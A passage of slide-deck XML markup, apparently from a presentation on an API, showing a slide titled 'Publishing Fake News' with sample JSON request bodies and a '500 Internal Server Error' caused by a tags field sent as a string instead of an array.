              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"uuid": "",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"title": "aaa",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"description": ""</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"tags": "",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"category": ""</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206" name="Google Shape;206;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="210" name="Shape 210"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="211" name="Google Shape;211;p31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;212;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="213" name="Google Shape;213;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Google Shape;214;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683875" y="1008075"/>
            <a:ext cx="8073300" cy="54003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b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> "500 Internal Server Error"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Body gave an error about being unable to read tags into an array..</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"streams": "a",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"uuid": "",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"title": "aaa",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"description": "",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"tags":[],</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>"category":""</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="215" name="Google Shape;215;p31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="219" name="Shape 219"/>
        <p:cNvGrpSpPr/>
